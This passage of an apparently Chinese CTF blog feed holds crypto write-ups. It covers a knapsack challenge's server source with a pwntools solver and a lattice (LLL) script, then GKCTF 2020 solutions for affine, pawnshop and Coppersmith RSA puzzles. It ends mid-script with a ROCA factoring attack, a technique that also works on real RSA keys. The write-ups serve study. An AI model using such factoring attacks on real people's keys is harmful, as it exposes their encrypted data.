class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">'flag'</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">'''</span></span><br><span class="line"><span class="string"> ____             _                     _             _       _   _ </span></span><br><span class="line"><span class="string">| __ )  __ _  ___| | ___ __   __ _  ___| | _____ _ __( )___  | | | | ___  _ __ ___   ___</span></span><br><span class="line"><span class="string">|  _ \ / _` |/ __| |/ / '_ \ / _` |/ __| |/ / _ \ '__|// __| | |_| |/ _ \| '_ ` _ \ / _ \\</span></span><br><span class="line"><span class="string">| |_) | (_| | (__|   &lt;| |_) | (_| | (__|   &lt;  __/ |    \__ \ |  _  | (_) | | | | | |  __/</span></span><br><span class="line"><span class="string">|____/ \__,_|\___|_|\_\ .__/ \__,_|\___|_|\_\___|_|    |___/ |_| |_|\___/|_| |_| |_|\___|</span></span><br><span class="line"><span class="string">                      |_|'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout_handler</span><span class="params">(signum, frame)</span>:</span></span><br><span class="line">    print(<span class="string">"\n[!]Sorry, timeout..."</span>)</span><br><span class="line">    <span class="keyword">raise</span> TimeoutError</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Proof of work [++++++++++++++++]"</span>)</span><br><span class="line">    proof = <span class="string">''</span>.join(</span><br><span class="line">        [random.choice(string.ascii_letters+string.digits)</span><br><span class="line">         <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">    )</span><br><span class="line">    proof_cipher = sha256(proof.encode()).hexdigest()</span><br><span class="line">    print(<span class="string">"sha256(XXXX+&#123;&#125;) == &#123;&#125;"</span>.format(proof[<span class="number">4</span>:], proof_cipher))</span><br><span class="line">    guess = input(<span class="string">"Give me XXXX: "</span>)</span><br><span class="line">    <span class="keyword">if</span> len(guess) != <span class="number">4</span> <span class="keyword">or</span> sha256((guess + proof[<span class="number">4</span>:]).encode()).hexdigest() != proof_cipher:</span><br><span class="line">        print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Proof of work has passed [++++++++++++++++]"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Knapsack</span>:</span></span><br><span class="line">    n = <span class="literal">None</span></span><br><span class="line">    elements = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load</span><span class="params">(self, n, nbits)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.elements = set()</span><br><span class="line">        <span class="keyword">while</span> len(self.elements) &lt; n:</span><br><span class="line">            self.elements.add(getRandomNBitInteger(nbits))</span><br><span class="line">        self.elements = list(self.elements)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">super_load</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.elements = [<span class="number">233</span>]</span><br><span class="line">        sum = <span class="number">233</span></span><br><span class="line">        <span class="keyword">while</span> len(self.elements) &lt; n:</span><br><span class="line">            self.elements.append(sum + getRandomRange(<span class="number">1</span>, <span class="number">128</span>))</span><br><span class="line">            sum += self.elements[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.n <span class="keyword">or</span> <span class="keyword">not</span> self.elements:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">"[!]Something Wrong..."</span>)</span><br><span class="line">        m = getRandomNBitInteger(self.n)</span><br><span class="line">        m_list = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> bin(m)[<span class="number">2</span>:]]</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(self.n):</span><br><span class="line">            c += m_list[i] * self.elements[i]</span><br><span class="line">        <span class="keyword">return</span> (c, m)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_1 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.load(<span class="number">10</span>, <span class="number">16</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_1 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_2</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_2 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.super_load(<span class="number">50</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_2 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge_3</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] Enjoy challenge_3 [++++++++++++++++]"</span>)</span><br><span class="line">    K = Knapsack()</span><br><span class="line">    K.load(<span class="number">100</span>, <span class="number">312</span>)</span><br><span class="line">    print(<span class="string">"[+]There are &#123;&#125; elements in the knapsack."</span>.format(K.n))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(K.n):</span><br><span class="line">        print(K.elements[i])</span><br><span class="line">    (c, m) = K.encrypt()</span><br><span class="line">    print(<span class="string">"[+]c = &#123;&#125;"</span>.format(c))</span><br><span class="line">    guess = input(<span class="string">"[-]m(hex) = "</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        guess = int(guess, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> guess == m:</span><br><span class="line">            print(<span class="string">"[++++++++++++++++] challenge_3 has passed [++++++++++++++++]"</span>)</span><br><span class="line">            print(<span class="string">"[+]Excellent Backpacker, your flag is &#123;&#125;"</span>.format(flag))</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"[++++++++++++++++] You failed, exit... [++++++++++++++++]"</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    challenge_1()</span><br><span class="line">    challenge_2()</span><br><span class="line">    challenge_3()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(banner)</span><br><span class="line">        signal.signal(signal.SIGALRM, timeout_handler)</span><br><span class="line">        signal.alarm(<span class="number">6000000</span>)</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>也是背包问题，一共三关。</p><p>第一关，由于数字很小。范围是0到1023，所以可以直接爆破得到。</p><p>第二关，是超递增背包问题。跟上面那个一样的。</p><p>第三关，不是超递增背包问题了，然后量比较大，数字也比较大。这里用Latiice可以解决。格长这样</p><p><img src="https://i.loli.net/2020/05/23/TPY4iVzJloIbMXc.png" alt></p><p>然后解起来有概率问题。就算格基规约成功了，也只有1/2的概率成功。由于没有sage环境，这里是半自动脚本</p><p>交互脚本，可以打到第三关，然后拿到数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime <span class="keyword">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(data,m)</span>:</span></span><br><span class="line">    m = bin(m)[<span class="number">2</span>:]</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)):</span><br><span class="line">        c += int(m[i])*data[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">"183.129.189.60"</span>,<span class="string">"10036"</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"sha256(XXXX+"</span>)</span><br><span class="line">suffix=sh.recv(len(<span class="string">'SLhlaef5L6nM6pYx'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"== "</span>)</span><br><span class="line">cipher=sh.recv(len(<span class="string">'3ade7863765f07a3fbb9d853a00ffbe0485c30eb607105196b0d1854718a7b6c'</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"XXXX: "</span>)</span><br><span class="line">proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=<span class="number">4</span>, method=<span class="string">'fixed'</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(proof)</span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> enc(data,i) == c:</span><br><span class="line">        <span class="keyword">print</span> i</span><br><span class="line">        sh.sendline(hex(i)[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"no"</span></span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line"><span class="comment">#print(data)</span></span><br><span class="line"></span><br><span class="line">data.reverse()</span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">m=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> c&gt;=i:</span><br><span class="line">        m+=<span class="string">'1'</span></span><br><span class="line">        c-=i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m+=<span class="string">'0'</span></span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">if</span> enc(data,int(m,<span class="number">2</span>)) :</span><br><span class="line">    m = m[::<span class="number">-1</span>]</span><br><span class="line">m = int(m,<span class="number">2</span>)</span><br><span class="line">sh.sendline(hex(m)[<span class="number">2</span>:])</span><br><span class="line">sh.recvuntil(<span class="string">"knapsack.\n"</span>)</span><br><span class="line">data=[]</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    data.append(int(sh.recvline()[:<span class="number">-1</span>]))</span><br><span class="line">    </span><br><span class="line">print(<span class="string">"a = "</span>+str(data).replace(<span class="string">"L"</span>,<span class="string">""</span>))</span><br><span class="line">sh.recvuntil(<span class="string">"[+]c = "</span>)</span><br><span class="line">c = int(sh.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>])</span><br><span class="line">print(<span class="string">"s = "</span>+str(c))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>拿到数据了去用sage解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">m=[]</span><br><span class="line">a = </span><br><span class="line">s =</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    b=[]</span><br><span class="line">    for j in range(100):</span><br><span class="line">        if i == j:</span><br><span class="line">            b.append(1)</span><br><span class="line">        else:</span><br><span class="line">            b.append(0)</span><br><span class="line">    m.append(b)</span><br><span class="line"> </span><br><span class="line">b=[]</span><br><span class="line">for i in range(100):</span><br><span class="line">    m[i].append(2**156*a[i])</span><br><span class="line">    b.append(1/2)</span><br><span class="line"></span><br><span class="line">b.append(2**156*s)</span><br><span class="line">m.append(b)</span><br><span class="line">#print(len(m[0])) </span><br><span class="line">M = matrix(QQ, m)</span><br><span class="line">v = M.LLL()[0]</span><br><span class="line">print(v)</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in vv[:-1]:</span><br><span class="line">    if i == 1/2:</span><br><span class="line">        flag+=&apos;1&apos;</span><br><span class="line">    elif i == -1/2:</span><br><span class="line">        flag+=&apos;0&apos;</span><br><span class="line">print(bytes.fromhex(hex(int(flag,2))[2:]))</span><br></pre></td></tr></table></figure><p>然后提交，碰点运气。</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 GKCTF</title>
      <link href="/2020/05/24/2020GKCTF/"/>
      <url>/2020/05/24/2020GKCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="小学生的密码学"><a href="#小学生的密码学" class="headerlink" title="小学生的密码学"></a>小学生的密码学</h2><p>最基础仿射加密</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">''</span>.join(chr(((ord(i)-ord(<span class="string">'a'</span>) - <span class="number">6</span>))*inverse(<span class="number">11</span>,<span class="number">26</span>)%<span class="number">26</span>+ord(<span class="string">'a'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'welcylk'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'flag&#123;'</span>+b64encode(flag)+<span class="string">'&#125;'</span>)</span><br></pre></td></tr></table></figure><h2 id="汉字的秘密"><a href="#汉字的秘密" class="headerlink" title="汉字的秘密"></a>汉字的秘密</h2><p>当铺密码，然后有点脑洞的移位密码</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">69</span>,<span class="number">74</span>,<span class="number">62</span>,<span class="number">67</span>,<span class="number">118</span>,<span class="number">83</span>,<span class="number">72</span>,<span class="number">77</span>,<span class="number">86</span>,<span class="number">55</span>,<span class="number">71</span>,<span class="number">57</span>,<span class="number">82</span>,<span class="number">57</span>,<span class="number">64</span>,<span class="number">63</span>,<span class="number">51</span>,<span class="number">107</span>]</span><br><span class="line">flag=''.join(chr(a[i]+(ord('f')-ord('e'))+i) for i in range(len(a)))</span><br></pre></td></tr></table></figure><h2 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h2><p>已知p高位，coppersmith，现成的exp一把梭</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p = </span><br><span class="line">p_new = (p&gt;&gt;128)&lt;&lt;128</span><br><span class="line">pbits = 1024</span><br><span class="line">kbits = 128</span><br><span class="line">pbar = p_new &amp; (2^pbits-2^kbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0] <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">p = x0 + pbar</span><br></pre></td></tr></table></figure><p>分解了n，之后这一题就结束了</p><h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>p=k  *M + (65537 ** a %M)；ROCA, 是一个CVE，github上也有现成轮子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#p,q=k*M+(65537**a %M)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hardcoded parameters for efficiency</span></span><br><span class="line"><span class="comment"># Found using params.py</span></span><br><span class="line">param = \</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">512</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">39</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">62</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">37</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x924cba6ae99dfa084537facc54948df0c23da044d8cabe0edd75bc6</span>,</span><br><span class="line">    <span class="string">"M_prime"</span>: <span class="number">0x1b3e6c9433a7735fa5fc479ffe4027e13bea</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x80000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">1024</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">71</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">134</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">37</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x7923ba25d1263232812ac930e9683ac0b02180c32bae1d77aa950c4a18a4e660db8cc90384a394940593408f192de1a05e1b61673ac499416088382</span>,</span><br><span class="line">    <span class="string">"M_prime"</span>: <span class="number">0x24683144f41188c2b1d6a217f81f12888e4e6513c43f3f60e72af8bd9728807483425d1e</span>,</span><br><span class="line">    <span class="string">"m"</span>: <span class="number">4</span>,</span><br><span class="line">    <span class="string">"t"</span>: <span class="number">5</span>,</span><br><span class="line">    <span class="string">"c_a"</span>: <span class="number">0x40000000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="number">2048</span>: &#123;</span><br><span class="line">    <span class="string">"n"</span>: <span class="number">126</span>,</span><br><span class="line">    <span class="string">"a_max"</span>: <span class="number">434</span>,</span><br><span class="line">    <span class="string">"k_max"</span>: <span class="number">53</span>,</span><br><span class="line">    <span class="string">"M"</span>: <span class="number">0x7cda79f57f60a9b65478052f383ad7dadb714b4f4ac069997c7ff23d34d075fca08fdf20f95fbc5f0a981d65c3a3ee7ff74d769da52e948d6b0270dd736ef61fa99a54f80fb22091b055885dc22b9f17562778dfb2aeac87f51de339f71731d207c0af3244d35129feba028a48402247f4ba1d2b6d0755baff6</span>,</span><br><span class="line">    <span 